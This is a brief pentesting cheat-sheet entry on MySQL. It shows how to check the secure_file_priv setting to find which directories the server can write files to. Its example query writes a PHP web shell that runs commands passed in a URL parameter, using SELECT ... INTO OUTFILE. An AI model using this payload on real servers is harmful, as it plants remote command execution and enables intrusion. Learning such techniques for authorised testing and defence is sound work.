# Pentesting MySQL

## Check file locations that you can write to
[Source](https://stackoverflow.com/questions/32737478/how-should-i-resolve-secure-file-priv-in-mysql)

When attempting to write to a file you may get the following error:
```
select "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/tmp/shell.php';
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

You can check the file locations that you can write to by running the following command:
```
mysql> SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-----------------------+
| Variable_name    | Value                 |
+------------------+-----------------------+
| secure_file_priv | /var/lib/mysql-files/ |
+------------------+-----------------------+
1 row in set (0.00 sec)
```
